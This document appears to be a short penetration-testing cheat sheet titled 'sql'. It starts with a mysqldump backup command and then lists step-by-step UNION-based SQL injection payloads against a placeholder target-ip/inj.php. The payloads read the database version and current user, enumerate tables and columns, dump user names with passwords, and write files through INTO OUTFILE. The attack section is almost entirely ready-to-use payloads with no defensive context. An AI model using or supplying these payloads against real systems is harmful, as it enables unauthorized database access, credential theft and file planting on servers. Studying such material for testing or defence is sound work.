---
title: sql
weight: 20
---

# mysqldump
----------------

backup all mysql databases
```shell
mysqldump -u username -ppassword --all-databases --single-transaction
```
----------------

# sqli
----------------

check if you can find a row, where you can place your output  
```shell
http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8
```

get the version of the database  
```shell
http://target-ip/inj.php?id=1 union all select 1,2,3,@@version,5
```

get the current user  
```shell
http://target-ip/inj.php?id=1 union all select 1,2,3,user(),5
```

see all tables  
```shell
http://target-ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables
```

get column names for a specified table  
```shell
http://target-ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'
```

concat user names and passwords (0x3a represents “:”)  
```shell
http://target-ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users
```

write into a file  
```shell
http://target-ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'
```

----------------